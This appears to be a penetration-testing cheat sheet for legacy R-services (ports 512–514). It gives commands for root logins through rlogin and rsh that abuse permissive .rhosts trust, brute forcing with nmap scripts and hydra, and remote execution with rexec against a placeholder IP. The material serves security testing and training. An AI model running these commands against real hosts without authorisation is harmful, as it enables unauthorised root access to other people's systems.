# R-Services (512–514)

!!! tip "Start here"
    Try passwordless rlogin immediately: `rlogin -l root 10.10.10.10`. If `.rhosts` contains `+ +` or trusts your source IP, you get a shell with no credentials. Also test `rsh -l root 10.10.10.10 id`. These services are rare but almost always misconfigured when present.

---

## Enumeration

```bash
nmap -p 512-514 --script rexec-brute,rsh-brute,rlogin-brute 10.10.10.10
```

---

## Trust-Based Access (rlogin / rsh)

```bash
rlogin -l root 10.10.10.10
rsh -l root 10.10.10.10 id
rsh -l root 10.10.10.10
```

Authentication relies on `/etc/hosts.equiv` and `~/.rhosts`. If either contains `+ +`, any host can authenticate as any user.

---

## Brute Force

```bash
hydra -L users.txt -P passwords.txt rexec://10.10.10.10
hydra -L users.txt -P passwords.txt rlogin://10.10.10.10
```

---

## Remote Execution (rexec)

```bash
rexec 10.10.10.10 -l <user> -p <pass> "id"
```

!!! tip "Real-world"
    R-services predate SSH and have no encryption — all traffic including credentials is cleartext. They're nearly extinct on modern systems but occasionally show up on legacy Unix hosts, embedded devices, or old network appliances. When you find them, trust-based access is the first thing to check before touching brute force.
